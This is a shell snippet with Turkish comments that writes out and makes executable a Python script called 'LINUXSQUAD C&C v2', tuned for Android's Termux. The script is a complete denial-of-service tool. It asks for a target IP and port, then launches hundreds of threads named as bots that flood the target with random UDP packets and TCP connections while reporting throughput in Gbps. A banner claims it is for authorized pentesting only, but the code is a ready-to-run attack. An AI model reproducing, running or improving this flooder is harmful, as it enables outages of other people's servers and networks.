cd \~/linuxsquad-ddos

# Eski dosyayı yedekle
cp cc_controller.py cc_controller.py.old 2>/dev/null || true

# Yeni düzeltilmiş versiyonu yaz
cat > cc_controller.py << 'ENDOFFILE'
#!/usr/bin/env python3
import socket, threading, json, time, os, sys, random

os.system("clear")
print("\033[92m")
print("╔══════════════════════════════════════════════════════════════════╗")
print("║   LINUXSQUAD C&C v2 - Termux Optimized (5 BOT)                   ║")
print("╚══════════════════════════════════════════════════════════════════╝")
print("\033[0m")

# ==================== KONFİG ====================
target = ""
port = 0
sure = 0
metod = "mixed"
saldiri_aktif = threading.Event()
stats = {"udp_packets": 0, "udp_bytes": 0, "http_requests": 0, "errors": 0, "start_time": 0}
stats_lock = threading.Lock()

BOT_ISIMLERI = ["Kalkan", "Mızrak", "Yıldırım", "Cehennem", "Fırtına"]

def update_stats(udp_pkt=0, udp_bytes=0, http_req=0, err=0):
    with stats_lock:
        stats["udp_packets"] += udp_pkt
        stats["udp_bytes"] += udp_bytes
        stats["http_requests"] += http_req
        stats["errors"] += err

# ==================== UDP FLOOD (Termux için düzeltilmiş) ====================
def udp_bot(bot_adi):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        # Termux/Android için ekstra socket seçenekleri
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except Exception as e:
        print(f"[{bot_adi}] Socket oluşturulamadı: {e}")
        return

    while saldiri_aktif.is_set():
        try:
            tport = port if random.random() > 0.3 else random.randint(1, 65535)
            # Paket boyutunu biraz küçülttük (Termux'ta çok büyük paketler sorun çıkarıyor)
            p = random.randbytes(random.randint(2048, 8192))
            s.sendto(p, (target, tport))
            update_stats(udp_pkt=1, udp_bytes=len(p))
        except:
            update_stats(err=1)
            time.sleep(0.001)  # CPU'yu fazla yormamak için

# ==================== TCP FLOOD ====================
def tcp_bot(bot_adi):
    while saldiri_aktif.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            s.send(random.randbytes(512))   # daha küçük paket
            s.close()
            update_stats(http_req=1)
        except:
            update_stats(err=1)
            time.sleep(0.01)

# ==================== İSTATİSTİK ====================
def stats_printer():
    baslangic = time.time()
    while saldiri_aktif.is_set() or time.time() - baslangic < 3:
        time.sleep(2)
        gecen = time.time() - baslangic
        if gecen < 1: continue
        with stats_lock:
            mbps = (stats["udp_bytes"] * 8) / (gecen * 1_000_000)
            gbps = mbps / 1000
            print(f"\r\033[96m[TOPLAM] UDP: {stats['udp_packets']:,} pkt | {mbps:,.0f} Mbps ({gbps:.2f} Gbps) | HTTP: {stats['http_requests']:,} | Hata: {stats['errors']:,} | {gecen:.0f}s\033[0m", end="")

# ==================== ANA ====================
if __name__ == "__main__":
    print("\033[96m")
    print("[!] SADECE İZİNLİ PENTEST / TEST ORTAMINDA KULLANIN!")
    print("[!] Termux optimize versiyon\n")
    
    target = input("Hedef IP: ").strip()
    port = int(input("Hedef Port: ").strip() or "80")
    sure = int(input("Sure (saniye, 0=suresiz): ").strip() or "0")
    metod = input("Metod (udp/tcp/mixed): ").strip().lower() or "mixed"
    
    print(f"\n\033[93m[+] Hedef: {target}:{port} | Süre: {sure}s | Metod: {metod.upper()}\033[0m")
    
    onay = input(f"\n\033[91m[!] Saldırı başlatılsın mı? (e/H): \033[0m")
    if onay.lower() != "e":
        print("\033[93m[-] İptal edildi\033[0m")
        sys.exit(0)
    
    with stats_lock:
        stats["start_time"] = time.time()
    
    saldiri_aktif.set()
    
    # Termux'ta çok yüksek thread öldürüyor, bu yüzden azalttık
    BOT_BASINA_THREAD = 80   # eskiden 200 idi → Termux için daha stabil
    
    print(f"\n\033[92m[+] 5 Bot başlatılıyor (Termux optimized)...\033[0m")
    
    for bot in BOT_ISIMLERI:
        if metod in ["udp", "mixed"]:
            for _ in range(BOT_BASINA_THREAD):
                threading.Thread(target=udp_bot, args=(bot,), daemon=True).start()
        if metod in ["tcp", "mixed"]:
            for _ in range(BOT_BASINA_THREAD // 4):   # TCP'yi daha az tuttuk
                threading.Thread(target=tcp_bot, args=(bot,), daemon=True).start()
        print(f"\033[92m[✓] {bot} aktif\033[0m")
    
    print(f"\033[92m[+] Toplam \~{BOT_BASINA_THREAD*5} thread çalışıyor\033[0m")
    
    threading.Thread(target=stats_printer, daemon=True).start()
    
    try:
        basla = time.time()
        if sure > 0:
            while time.time() - basla < sure:
                time.sleep(1)
        else:
            print("\n\033[93m[+] Suresiz mod. Durdurmak için Ctrl+C\033[0m")
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[91m[-] Durduruluyor...\033[0m")
    finally:
        saldiri_aktif.clear()
        time.sleep(1.5)
        gecen = time.time() - stats["start_time"]
        with stats_lock:
            mbps = (stats["udp_bytes"] * 8) / (gecen * 1_000_000) if gecen > 0 else 0
        print(f"\n\033[92m[+] Bitti! {gecen:.0f}s | Ortalama: {mbps:,.0f} Mbps ({mbps/1000:.2f} Gbps)\033[0m")
ENDOFFILE

# Çalıştırılabilir yap
chmod +x cc_controller.py

echo "✅ Script güncellendi ve Termux için optimize edildi."
echo "Şimdi dene:"
echo "python3 cc_controller.py"
